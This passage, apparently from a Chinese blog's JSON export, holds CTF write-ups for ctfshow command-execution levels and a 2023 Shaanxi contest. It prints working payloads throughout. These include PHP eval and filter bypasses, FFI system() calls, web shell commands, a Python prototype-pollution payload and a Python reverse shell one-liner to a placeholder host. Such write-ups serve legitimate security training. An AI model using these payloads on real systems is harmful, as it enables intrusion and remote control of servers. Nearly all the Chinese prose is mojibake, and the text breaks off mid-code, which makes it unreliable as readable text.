çš„ç–‘æƒ‘\n\nç®€å•ç†è§£å°±æ˜¯å¦‚ä¸‹ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687751488270-6a4b96d5-ad14-4847-ba20-740380bf94ee.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687752581243-411a5b59-3fd4-435f-b2ae-a041f8eb682d.png)\n\nç„¶åé€šè¿‡å–åå¾—åˆ°-1 å†æ‹¼æ¥å¾—åˆ°-2\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687752418481-17fa71fd-5a2b-40af-989e-2cc6d2b92510.png)\n\nè¿™æ ·ä¸æ–­çš„æ‹¼æ¥åˆ°-37 ç„¶åå†å–åå°±å¾—åˆ°36äº†\n\npayloadï¼š`$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))`\n\n# WEB-58~65(æ–‡ä»¶è¯»å–å‡½æ•°)\n\nsystemä¸€ç±»çš„å‡½æ•°éƒ½è¢«ç¦äº† æ‰€ä»¥åªèƒ½ç”¨phpä¸­çš„ç‰¹æ®Šå‡½æ•° ç”¨æ–‡ä»¶è¯»å–çš„å‡½æ•°è¯»å°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687753369662-556faed8-7490-43d6-89df-0b6e027d753c.png)\n\npostï¼š`c=show_source('flag.php');`\n\n`c=highlight_file('flag.php');`æœ‰å¾ˆå¤šç±»ä¼¼äºæ— å‚rceæ„é€ å‘¢ç§å¥—å¨ƒ \n\n# WEB-66(waf show_source())\n\n```\nc=print_r(scandir('/'));\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687758908328-a73a76e2-7820-4f49-81e3-a3ba983d16d2.png)\n\nå½“å‰ç›®å½•ä¸‹çš„flag.phpæ˜¯å‡çš„ \n\nshow_source()è¢«wafäº† ç”¨highlight_file()è¯»flag.txtå³å¯\n\n```\nc=highlight_file('/flag.txt');\n```\n\n# WEB-67(waf print_r())\n\nç”¨var_dump() bypasså³å¯\n\n```\nc=highlight_file('/flag.txt');\n```\n\n# WEB-68~70(waf highlight_file())\n\n å› ä¸ºç¦ç”¨äº†highlight_file()æ‰€ä»¥æºç ä¹Ÿä¸æ˜¾ç¤ºäº† 2333 è€Œä¸”å¥½å¤šé¢˜ç›®çš„payloadéƒ½å¯ä»¥æ‰“é€šå¥½å‡ ä¸ªå…³å¡ é¢˜ç›®å¤ªå¤šè´¨é‡çœŸä¸å¤ªè¡Œ\n\n```\nc=include('/flag.txt');\n```\n\n# WEB-71(è¾“å‡ºç¼“å†²åŒº)\n\nç»™äº†æºç \n\n```php\n<?php\n  error_reporting(0);\nini_set('display_errors', 0);\n// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ\nif(isset($_POST['c'])){\n  $c= $_POST['c'];\n  eval($c);\n  $s = ob_get_contents();\n  ob_end_clean();\n  echo preg_replace(\"/[0-9]|[a-z]/i\",\"?\",$s);\n}else{\n  highlight_file(__FILE__);\n}\n\n?>\n```\n\næ¶‰åŠåˆ°è¾“å‡ºç¼“å†²åŒºçŸ¥è¯† \n\nob_get_contents()\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687760675094-25063e0b-5792-4f97-b44f-e12bd073111b.png)\n\nob_end_clean()\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687760729756-1353ad44-911d-4aef-9a88-e499dcec5ce2.png)\n\næ ¹æ®æºç  æˆ‘çš„ç†è§£æ˜¯å°†eval()è¾“å‡ºçš„å†…å®¹ä¼šåˆ°è¾“å‡ºç¼“å­˜åŒº\n\nç„¶åé€šè¿‡ob_get_contents()å‡½æ•°èµ‹å€¼ç»™s ç„¶åé€šè¿‡ä¸€ä¸ªæ­£åˆ™åŒ¹é…å°†å†…å®¹æ›¿æ¢ä¸è®©æˆ‘ä»¬å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„flag \n\né‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ‰§è¡Œå®Œeval()å‡½æ•°ä¹‹åä¸è¿›è¡Œä¹‹åçš„æ“ä½œå°±å¯ä»¥bypassäº† è¿™ä¹Ÿæ˜¯å®˜æ–¹payloadçš„åŸç†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687761011069-74a43caf-2a46-41a3-bd40-37d972cb9a4e.png)\n\nå› ä¸ºæ ¹æ®å®˜æ–¹æ–‡æ¡£ exitæ˜¯ä¸ªè¯­æ³•ç»“æ„ å¦‚æœä¸è¾“å‡ºä¸€ä¸ªæ¶ˆæ¯ åˆ™å¯ä»¥çœç•¥åœ†æ‹¬å· å°±æœ‰ä¸‹é¢ä¸¤ç§paylaod\n\n```\nc=include('/flag.txt');exit;\nc=include('/flag.txt');exit(0);\n```\n\n# WEB-72(phpåŸç”Ÿç±»+UAF)\n\nè¿™é“é¢˜ç›®çœ‹å¤§ä½¬çš„WPæ˜¯ å¼€å¯äº†open_basedirã€‚  \n\nå› æ­¤éœ€è¦æ‰“ç»„åˆæ‹³\n\nDirectoryIteratorä¸glob://åè®®ç»“åˆå°†æ— è§†open_basedirå¯¹ç›®å½•çš„é™åˆ¶ï¼Œå¯ä»¥ç”¨æ¥åˆ—ä¸¾å‡ºæŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚  \n\nè¿™é“é¢˜ç›®ç”¨åˆ°äº†phpåŸç”Ÿç±» ä¹‹å‰æœ‰äº†è§£è¿‡ https://xz.aliyun.com/t/9293#toc-13\n\n```php\nc=?><?php\n$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n} \nexit(0);\n?>\n```\n\nå…ˆé€šè¿‡è¿™ä¸ªpayload è·å–flagæ–‡ä»¶å\n\né¦–å…ˆé€šè¿‡`?>`å…ˆé—­åˆä¹‹å‰çš„`<?php`å†é€šè¿‡åŸç”Ÿç±»DirectoryIterator()ä¸æ–­éå†æ¥è·å–æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶\n\nglob://åè®® æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ \n\n`glob:///*`åº”è¯¥æ€ä¹ˆç†è§£å‘¢ å°±æ˜¯æŸ¥æ‰¾ æ ¹ç›®å½•ä¸‹`/*`è¿™é‡Œçš„`*`å°±æ˜¯linuxçš„é€šé…ç¬¦ å°±æ˜¯è¯´æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½è¢«ä¼šè¯»å–\n\n  `__toString()æ–¹æ³•å¯ä»¥è·å–å­—ç¬¦ä¸²å½¢å¼çš„æ–‡ä»¶å `\n\nè¯»å–çš„æ—¶å€™éœ€è¦ä¸æ–­åœ°éå† å› æ­¤éœ€è¦\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687763552888-a3900bed-abe0-411e-aa26-194a77f58fd0.png)\n\nå‘ç°flagåœ¨flag0.txt ä¹‹åæ˜¯pwnçš„çŸ¥è¯†æˆ‘æŒºæ‡µé€¼çš„\n\né€šè¿‡UAFè„šæœ¬å»è¯»flag æŒºå¤¸å¼ çš„\n\n# WEB-72~74(phpåŸç”Ÿç±»)\n\nå’Œä¸Šé¢ä¸€æ ·é€šè¿‡åŸç”Ÿç±»è·å–flagæ–‡ä»¶å ç„¶åè¿™é‡Œå¯ä»¥ç›´æ¥ç”¨include()å‡½æ•°è¯»flagå³å¯\n\n```\nc=include('/flagc.txt');exit;\n```\n\n# WEB-75~76(mysql load_file())\n\nè¿™é¢˜ç›®å¤ªæŠ½è±¡äº† è¿æ¥mysqlé€šè¿‡mysqlçš„load_file()å»è¯»æ–‡ä»¶ ã€‚ã€‚ã€‚\n\n```php\nc=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',\n'root');foreach($dbh->query('select load_file(\"/flag36.txt\")') as $row)\n{echo($row[0]).\"|\"; }$dbh = null;}catch (PDOException $e) {echo $e-\n>getMessage();exit(0);}exit(0);\n```\n\n# WEB-77(FFI)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687765898573-1e127140-9340-45ea-8344-54348dd7523d.png)\n\næˆ‘çš„ç†è§£æ˜¯è®©phpç›´æ¥è°ƒç”¨åº•å±‚cè¯­è¨€çš„å‡½æ•°åˆ©ç”¨cä»£ç å®ç°åŠŸèƒ½\n\n```c\nc=$ffi = FFI::cdef(\"int system(const char *command);\");\n$a='/readflag > 1.txt';\n$ffi->system($a);\n```\n\nFFI::cdef()åˆ›å»ºä¸€ä¸ªFFIå¯¹è±¡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687765988379-4c1b4a1f-62e9-418c-a270-ca5da1c112c0.png)\n\nç„¶ååˆ©ç”¨cè¯­è¨€è°ƒç”¨system()å‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687766113821-5efd6715-e709-4dd4-a066-6974d5a2cf79.png)\n\n# WEB-118ï¼ˆ${PATH}ï¼‰\n\nfuzzä¸€ä¸‹å‘ç°åªèƒ½ç”¨ å¤§å†™å­—æ¯A-Zå’Œ${}~.?:\n\né€šè¿‡linuxç¯å¢ƒå˜é‡æˆªå–å­—æ¯æ–¹å¼æ„é€ rce\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687766943345-9b8e89eb-1525-4a07-bb3a-9341e8c19f03.png)\n\nå…³äºPATH\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687767036592-081f4207-8e55-41a1-93e9-fba8c718b899.png)\n\nç„¶åæˆªå–æˆ‘ä»¬æƒ³è¦çš„å­—æ¯RCEå³å¯\n\næ„é€  nl flag.php\n\n`${PATH:~A}${PWD:~A}$IFS????.???` è¿™é‡ŒAå’Œæ•°å­—0æ˜¯ä¸€æ ·çš„æ•ˆæœéƒ½æ˜¯ä¸‹æ ‡ ç„¶å`~`è¡¨ç¤ºä»æœ«å°¾å¼€å§‹æˆªå–\n\nåœ¨è¿™é‡Œæˆ‘ä»¬çš„é»˜è®¤ä½ç½®ä¸º`/var/www/html` å› æ­¤æ‰èƒ½æˆªå–åˆ°l\n\n# WEB-119~124(å¥‡æ·«æ„é€ paylaod)\n\nwaläº†PATHç›´æ¥å·äº†payload\n\n119:\n\n```php\n/bin/cat flag.php\ncode=${HOME:${#}:${##}}???${HOME:${#}:${##}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???\n/bin/base64 flag.php\ncode=${HOME:${#}:${##}}???${HOME:${#}:${##}}?????${#RANDOM} ????.???\n```\n\n120:\n\n```plain\ncode=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???\n```\n\n121:\n\n```php\n/bin/bash64\ncode=${PWD:${#}:${##}}???${PWD:${#}:${##}}?????${#RANDOM} ????.???\n/bin/rev\ncode=${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???\n```\n\n122:\n\n`#` å’Œ `SHLVL`éƒ½ä¸èƒ½ç”¨äº†,å¯ä»¥ç”¨`$?`æ¥è¡¨ç¤º1\n\né€šè¿‡$?æ¥å®ç°çš„ï¼Œ$?æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯\n\nä½†æ˜¯é»˜è®¤`$?`é»˜è®¤ä¸º0  å¯ä»¥ `<A` è¿”å›çš„é”™è¯¯å€¼ ä½¿å¾— `$?` ä¸º1  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1687768487790-1c21e6fc-1c8e-42a2-8b99-b78ad3bd770e.png)\n\n `paylaodï¼šcode=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???` å¤šè¯•å‡ æ¬¡å°±èƒ½æˆåŠŸ\n\n124ï¼š\n\nbuuctf Love mathä¸€æ¨¡ä¸€æ ·çš„é¢˜ç›® æˆ‘åšå®¢ä¹Ÿå†™è¿‡ä¸èµ˜è¿°äº†\n\npayloadç¨ç¨ä¸åŒ\n\n```\n?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos})&abs=system&acos=cat%20flag.php\n```\n\n\n\n# ç»“å°¾ï¼š\n\nå“¦ ç»ˆäºç»“æŸè¿™ä¸€ç« äº† æ–­æ–­ç»­ç»­ä¸‰å¤©æ—¥å®Œäº† åšåäº†  å¼€å¯ä¸‹ä¸€ç« ï¼ Keep Hackingï¼\n","tags":["å‘½ä»¤æ‰§è¡Œ"],"categories":["ctfshow"]},{"title":"2023å¹´ ç¬¬ä¸‰å±Šé™•è¥¿çœå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›ï¼ˆé«˜èŒé™¢æ ¡ç»„ï¼‰","url":"/post/ba5897f5.html","content":"\n2023å¹´ ç¬¬ä¸‰å±Šé™•è¥¿çœå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›ï¼ˆé«˜èŒé™¢æ ¡ç»„ï¼‰webå¤ç°\n\n<!--more-->\n\n# **easyrce**\n\næºç å¦‚ä¸‹ï¼š\n\n```php\n<?php\n  error_reporting(0);\nhighlight_file(__FILE__);\n\nif (!empty($_GET['PK'])){\n  $PK = $_GET['PK'];\n  if(blacklistFilter($_SERVER[\"QUERY_STRING\"])){\n    include $PK;\n  }else{\n    highlight_file(__FILE__);\n  }\n}\n\nfunction blacklistFilter($arg) {\n  $blacklist = array('[', ']', ';', '?', '@', '(', ')', 'exec', 'eval', '$', 'phpinfo', 'flag', 'data', 'filter', '#');\n  $filteredInput = str_replace($blacklist, '', $arg);\n  return $filteredInput;\n}\n```\n\nè¿™å‡ ä¹è¯¥wafçš„å…¨waf \n\nç›´æ¥ç”¨file://åè®®è¯»å°±è¡Œäº† å†æ¥å¥½å¥½çœ‹çœ‹è¿™ä¸ªåè®®;\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686237629788-b92a3fc6-11a3-4ba6-8077-8cde77aff1f7.png)\n\ntql\n\n# mua\n\nè¿™é¢˜å¤ªæŠ½è±¡äº†ï¼ï¼\n\n```php\n<?php\n    ignore_user_abort(true);\n    set_time_limit(0);\n    $file = 'shell.php';\n    $code = '<?php if(md5($_GET[\"pass\"])===\"c9b30e9fad74c62c2d0e4bb820964913\"){ if(strlen($_GET[\\'cmd\\'])<9){ @system($_GET[\\'cmd\\']); } } ?>';\n    while (1){\n        file_put_contents($file,$code);\n    usleep(5000);\n?>\n```\n\nå‘ç°ç»™äº†æºç  ä½†æ˜¯è¿™ä¸ªmd5æ ¹æœ¬å°±ä¸è®©äººè§£å‡ºæ¥\n\næŸ¥çœ‹robots.txt å‘ç°`/substr_pass.php`\n\nè·å¾—hint `?a=xx&b=xx`\n\nä¼ å‚`?a=0&b=1` ä¸åŒæ•°å­—æ—¶ä¼šç»™æˆ‘ä»¬passå†…å®¹\n\nå½“b=3 aä¸ºå…¶ä»–æ•°å­— å¯ä»¥çˆ†å‡ºpassçš„å†…å®¹ è¿™é‡Œéœ€è¦å†™ä¸€ä¸ªè„šæœ¬å®Œæˆ\n\n```python\nimport requests\nurl = 'http://b36384f5.clsadp.com/substr_pass.php'\nresult = []\nfor i in range(100):\n    payload = {\"a\":\"{}\".format(i),\"b\":3}\n    r = requests.get(url=url,params=payload)\n    print(r.text)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686239466990-7ea623b7-9543-41e6-941e-0041b5555925.png)\n\npass=passwordæ˜¯å¯Œå¼ºæ°‘ä¸»æ–‡æ˜å’Œè°è‡ªç”±å¹³ç­‰å…¬æ­£æ³•åˆ¶çˆ±å›½æ•¬ä¸šè¯šä¿¡å‹å–„   å¦ˆçš„ å¤ªæŠ½è±¡äº† \n\npayloadï¼š`shell.php?pass=passwordæ˜¯å¯Œå¼ºæ°‘ä¸»æ–‡æ˜å’Œè°è‡ªç”±å¹³ç­‰å…¬æ­£æ³•åˆ¶çˆ±å›½æ•¬ä¸šè¯šä¿¡å‹å–„&cmd=cat /h*`\n\n# **PPP**\n\nè¿™æ˜¯ä¸€é“pythonçš„åŸå‹é“¾æ±¡æŸ“ ä¹‹å‰æ²¡è§è¿‡ ä½†æ˜¯è·Ÿnodejsçš„åŸå‹é“¾æ±¡æŸ“å¤§åŒå°å¼‚ pythonåŸå‹é“¾å…·ä½“åˆ†æä¹‹åä¼šè¡¥ä¸Š ç°åœ¨å®åœ¨æ²¡æ—¶é—´ ç›´æ¥ç‹‚çœ‹ è¿™ç¯‡æ–‡ç«  mdæºç æ˜¯ä»è¿™é‡Œå·çš„å…«https://tttang.com/archive/1876/\n\nç»™äº†é™„ä»¶æºç  å¦‚ä¸‹ï¼š\n\n```python\nfrom flask import Flask,request\nimport json\n\napp = Flask(__name__)\n\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\ndef evilFunc(arg_1 , * , shell = False):\n    if not shell:\n        print(arg_1)\n    else:\n\n        print(__import__(\"os\").popen(arg_1).read())    \n\nclass Family:\n    def __init__(self):\n        pass  \n\nfamily = Family()\n\n@app.route('/',methods=['POST', 'GET'])\ndef index():\n    if request.data: //å…¶å®å°±æ˜¯postä¼ å‚\n        merge(json.loads(request.data), family)\n        evilFunc(\"whoami\")\n    return \"fun\"\n\n@app.route('/eval',methods=['GET'])\ndef eval():\n    if request.args.get('cmd'):\n        cmd = request.args.get('cmd')\n        evilFunc(cmd)\n    return \"ok\"\n\n\napp.run(host=\"0.0.0.0\",port= 3000,debug=False)\n```\n\nå¯ä»¥å‘ç°æœ‰ /å’Œ/eavl\n\n çœ‹åˆ°äº†è€ç†Ÿäºº `merge()`\n\npythonåŸå‹é“¾æ±¡æŸ“çš„é‡è¦ä»£ç å°±æ˜¯è¿™éƒ¨åˆ†\n\n```python\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n```\n\nè¾¾åˆ°çš„æ•ˆæœå’Œnodejsä¸­çš„å·®ä¸å¤š\n\nåœ¨/evalè·¯ç”±ä¸­ æˆ‘ä»¬å°†getè·å–åˆ°çš„å€¼ä¼ ç»™`evilFunc(cmd)`\n\n```python\ndef evilFunc(arg_1 , * , shell = False):\n    if not shell:\n        print(arg_1)\n    else:\n\n        print(__import__(\"os\").popen(arg_1).read()) \n```\n\nä½†å‰ææ˜¯ è¿™ä¸ªshellå‚æ•°ä¸ºä¸ºtrue ä¹Ÿæ˜¯å°±ä¸º1ä¹Ÿå°±æ˜¯ `if not shell`è¿™ä¸ªåˆ¤æ–­è¯­å¥ä¸ºå‡ \n\nå¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°è¢«åˆ›å»ºæ—¶å·²ç»é»˜è®¤å¤åˆ¶ç»™`shell = False` ä¹Ÿå°±æ˜¯0çš„æ•ˆæœ å¦‚æœæˆ‘ä»¬å¯ä»¥åŸå‹é“¾æ±¡æŸ“ å°†é»˜è®¤å€¼è®¾ç½®ä¸º`shell = 1` é‚£ä¹ˆå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†\n\n`__kwdefaults__` æ˜¯ Python ä¸­å‡½æ•°å¯¹è±¡çš„ä¸€ä¸ªç‰¹æ®Šå±æ€§ï¼Œç”¨äºè·å–å‡½æ•°çš„å…³é”®å­—å‚æ•°çš„é»˜è®¤å€¼ã€‚  \n\nevilFunc()å±äºå…¨å±€å‡½æ•°è¦ç”¨`__globals__`\n\npayloadå¦‚ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686391717044-677ff244-2d5c-45ee-ac79-c6ff7d8940dd.png)\n\n```python\n{\n    \"__init__\" : {\n        \"__globals__\" : {\n            \"evilFunc\" : {\n                \"__kwdefaults__\" : {\n                    \"shell\" : 1\n                }\n            }\n        }\n    }\n}\n```\n\næˆ–è€…æ˜¯\n\n```python\n{\n    \"__init__\" : {\n        \"__globals__\" : {\n            \"evilFunc\" : {\n                \"__defaults__\" : (\n                    True ,\n                )\n            }\n        }\n    }\n}\n```\n\nç„¶ååœ¨/ä¸‹æ‰“å…¥\n\nå†åˆ°/evalè·¯ç”±ä¸‹åå¼¹shellå³å¯ \n\nè¿™é‡Œåå¼¹shellçš„æ—¶å€™å½“æ—¶ç”¨äº†bashè¯•äº†å¥½å¤šæ¬¡æ²¡æœ‰æˆåŠŸ å› ä¸ºæ˜¯å¤ç° ä¼°è®¡æ˜¯é¶åœºé—®é¢˜ ä½†æ˜¯ç”¨pythonåå¼¹å°±å¯ä»¥æˆåŠŸ payloadå¦‚ä¸‹\n\n```python\ncmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n# **pyweb**\n\næ”¾è¿‡è‡ªå·±\n","tags":["pythonåŸå‹é“¾æ±¡æŸ“"],"categories":["å„èµ›äº‹WP"]},{"title":"2023å¹´ ç¬¬ä¸‰å±Šé™•è¥¿çœå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›ï¼ˆæœ¬ç§‘é«˜æ ¡ç»„ï¼‰","url":"/post/96d146ad.html","content":"\n2023å¹´ ç¬¬ä¸‰å±Šé™•è¥¿çœå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›ï¼ˆæœ¬ç§‘é«˜æ ¡ç»„ï¼‰ web miscå¤ç°\n\n<!--more-->\n\n# å‰è¨€\n\nè¿™æ¬¡ååº”å‡ºæˆ‘çš„ç¼ºç‚¹ï¼š\n\n1. ä¸å¤Ÿç»†å¿ƒï¼Œezpopè¿›å»åæ²¡æœ‰æºç  ä»¥ä¸ºæ˜¯ä¸Šneepuä¸€æ ·çš„æºç æ³„éœ²ï¼Œæ²¡æˆåŠŸï¼Œç„¶åæ‰«äº†åå°ï¼Œä¸€é¡¿çæ“ä½œï¼Œçœ‹äº†WPæ‰å‘ç°æ˜¯jsä¸­æœ‰ä¸€æ®µbase64ï¼Œå¦ˆçš„ï¼Œæˆ‘çœŸæ˜¯çº¯å‡ºç”Ÿï¼Œä¸å¤Ÿè®¤çœŸå·²ç»æ˜¯è€æ¯›ç—…äº†ã€‚\n2. æ‰¾åˆ°ç­”æ¡ˆäº†æ²¡æœ‰èƒ½å¤Ÿä»”ç»†ç…§payloadè¿›è¡Œ é‚£ä¸ªååºåˆ—åŒ–ä¿®æ”¹ç§æœ‰å±æ€§è€ƒåå°„çš„é¢˜ç›® æˆ‘tmå·²ç»payloadå†™çš„å’Œç­”æ¡ˆå‡ ä¹ä¸€æ ·äº†ï¼Œç»†èŠ‚å¯èƒ½æœ‰é—®é¢˜ï¼Œä½†æ˜¯å½“æ—¶åšé¢˜ä¸çŸ¥é“ä¸ºå•¥è¿˜æ˜¯æ˜¾ç¤ºè¢«waf ç„¶åå°±æ”¾å¼ƒäº† ã€‚ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685798284302-dc2c0ac8-5db9-4eb6-95f8-f566951d3782.png)\n\nå¦ˆçš„ è¿™é“é¢˜ç›®çœŸå¯æƒœ\n\n3.è€æ˜¯æƒ³è±¡ç€æŠŠé¢˜ç›®æƒ³çš„å¾ˆå¤æ‚å¾ˆéš¾ï¼Œå¯èƒ½ä¸€äº›é¢˜ç›®éœ€è¦å¾ˆæ‰å®çš„åŸºæœ¬åŠŸå§ã€‚\n\n# WEB\n\n## ezrce\n\nè¿™é“é¢˜ç›®ä¸€çœ¼ä¸çœŸ å’Œbuué‚£ä¸ªå¥—å¨ƒä¸€æ · ä¸»è¦è€ƒçš„å°±æ˜¯æ— å‚RCEï¼Œæ¯”è¾ƒå‹å¥½ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685799018101-fb2d644a-0735-4333-b4da-4e64b2a493b1.png)\n\nä»£ç å¦‚ä¸Š å·çš„ å¤ç°æ²¡ç¯å¢ƒ å¾ˆéš¾å—\n\nè‡ªå·±å†™ä¸€ä¸‹\n\n```php\n<?php\nerror_reporting(0);\nheader(\"Content-Type:text/html;charset=utf-8\"); //æ²¡æœ‰è¿™ä¸ªå°±ä¼šä¹±ç \necho \"ä½ æ˜¯è°å•Šå“¥ä»¬ï¼ŸæŠŠé’¥åŒ™ç»™æˆ‘ï¼ï¼ï¼ï¼<br/r>\";\n$key=$_GET['key'];\n$name=$_POST['name'];\n$qaq=$_POST['qaq'];\nif(isset($_GET['key'])){\n\thighlight_file(__FILE__);\n}\nif(isset($name)){\n\techo \"ä½ æ˜¯\".$name.\"å¤§äºº????<br/>\";\n\t$name1=preg_replace('/hahaha/e',$qaq,$name);\n\techo \"éª—æˆ‘çš„å§ï¼Œä½ æ˜æ˜æ˜¯    >>>>å°å°\".$name1;\n}\n?>\n```\n\n`preg_replace() /e`æ¨¡å¼å¯ä»¥ä»£ç æ‰§è¡Œ\n\næˆ‘çš„payloadï¼š`name=hahaha&qaq=print_r(eval(array_pop(apache_request_headers())))`\n\n```\napache_request_headers()`ä»£æ›¿`getallheaders()\n```\n\nç„¶ånext ä¹‹ç±»çš„ç§»åŠ¨æŒ‡é’ˆéƒ½è¢«wafäº† ç”¨`array_pop`bypass ä¹Ÿå°±æ˜¯æŠŠæ•°ç»„ä¸­æœ€åä¸€ä¸ªå…ƒç´ å€¼å¼¹å‡º æˆ‘ä»¬bpæŠ“åŒ…ä¿®æ”¹ä¸€ä¸‹ å…¶å®è¿˜æœ‰å…¶ä»–ç§»åŠ¨æŒ‡é’ˆçš„å‡½æ•°ï¼š`each()prev()ä»¥åŠcurrent()`ä½†æ˜¯éƒ½æ˜¯æŒ‡å‘å½“å‰ç”±è¯·æ±‚å¤´ç»„æˆæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  ä¹Ÿå°±æ˜¯host è¿™ä¸ªæ”¹äº†ç½‘é¡µå°±æ²¡æ³•æ­£å¸¸è®¿é—®äº† æ‰€ä»¥åªèƒ½é€šè¿‡`array_pop()`æŠŠæœ€åä¸€ä¸ªä¿®æ”¹äº† è®°å¾—å½“æ—¶æ˜¯`X-Real-Ip`\n\nçœ‹äº†å¤§ä½¬çš„WP è¿˜æœ‰ä¸€ç§æ˜¯å‚è€ƒhttps://xz.aliyun.com/t/9360 é€šè¿‡`session_id()`æ¥åšçš„\n\npaylaod:`name=hahaha&qaq=show_source(session_id(session_start()));`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685803106675-e16d229d-5e6d-40d0-9653-7cf198352d91.png)\n\nç„¶åæŠ“åŒ… `Cookie: session_id=/flag`å³å¯\n\n## ezpop\n\nè¿™ä¸ªé¢˜è¿›å»æ²¡æºç  ä»¥ä¸ºæ˜¯å½“æ—¶é‚£ä¸ªPHP <= 7.4.21è¿œç¨‹æºç æ³„éœ²æ¼æ´ https://cn-sec.com/archives/1530845.html\n\nè¯•äº† æ— æœ æœ€åçœ‹ä»–jsä¸­è—äº†ä¸€æ®µbase64 æˆ‘çœ¼ç\n\nä½†æ˜¯tmè°·æ­Œæµè§ˆå™¨ä»–åœ¨æºç ä¸­æ²¡æ˜¾ç¤ºå‡ºæ¥ æˆ‘æ“äº† è¿™ä¸æ˜¯æˆ‘çš„é”…å•Š æˆ‘æ—¥äº†\n\næºç å¦‚ä¸‹ï¼š\n\n```php\n<?php\nhighlight_file(__FILE__);\n\nclass night\n{\n    public $night;\n\n    public function __destruct(){\n        echo $this->night . 'å“’å’©å“Ÿ';\n    }\n}\n\nclass day\n{\n    public $day;\n\n    public function __toString(){\n        echo $this->day->go();\n    }\n\n    public function __call($a, $b){\n        echo $this->day->getFlag();\n    }\n}\n\n\nclass light\n{\n    public $light;\n\n    public function __invoke(){\n        echo $this->light->d();\n    }\n}\n\nclass dark\n{\n    public $dark;\n\n    public function go(){\n        ($this->dark)();\n    }\n\n    public function getFlag(){\n        include(hacked($this->dark));\n    }\n}\n\nfunction hacked($s) {\n    if(substr($s, 0,1) == '/'){\n        die('å‘†jioæ­¥');\n    }\n    $s = 